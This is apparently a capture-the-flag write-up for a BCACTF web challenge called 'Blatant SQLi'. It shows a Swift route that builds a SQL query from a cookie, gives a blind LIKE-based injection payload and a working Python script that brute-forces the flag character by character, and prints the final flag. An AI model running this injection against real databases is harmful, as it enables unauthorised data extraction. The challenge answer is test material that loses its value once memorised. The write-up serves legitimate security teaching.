# Blatant SQLi

Challenge Description:

> blah blah blah something something yusuf are you happy now

> Addendum: The flag has no uppercase letters.

> Hint1: What kind of feedback does the server give?

## Analyzing the website

```
func routes(_ app: Application) throws {
    app.get { req -> EventLoopFuture<Vapor.View> in
        var result: String?
        let content = req.cookies.all["flag"]?.string ?? ""
        
        do {
            for _ in try db.prepare("SELECT * FROM flags WHERE flag='\(content)'") {
                result = "yes"
            }
        } catch {
            result = "bad"
        }
        
        return req.view.render("index", ["result": result ?? "no"])
    }
}
```

The cookie named flag is used in the query below and there is a sql injection because there is no usage of prepared statements.  
A blind injection is needed here using the LIKE operator with % to bruteforce the flag character by character.

Payload --> `' or flag like \'{flag + char}%`  

We can automate this by using the script below which iterates through almost all the printable characters and finds the correct characters of the flag.

```python
import requests
import string

var = True
status = 0
flag = ''
url = f"http://web.bcactf.com:49213/"

printable = 'abcdefghijklmnopqrstuvwxyz0123456789}{['

while(var):
	for char in printable:
		print(f"Trying char --> {char}")
		payload = f"' or flag like \'{flag + char}%"

		cookies = {'flag' : payload}		

		r = requests.get(url , cookies = cookies)
		if "yes" in r.text:
			flag += char
			print(f"Got flag --> {flag}")
			if char == "}":
				print(f"Flag done --> {flag}")
				status = 1
			break

	if(status):
		break
		
	if(char == "["):
		print("_ here mostly")
		flag += '_'
```

Final Flag --> `bcactf{you_didnt_see_that_coming_q7ujtvr8q6zt}`

## References

This chall is very similar to the blinder_eye ctf challenge writeup i made recently.  
https://github.com/goku007xx/CTF-Writeups/blob/main/2022/UA_CWS_CTF/blinder_eye/writeup.md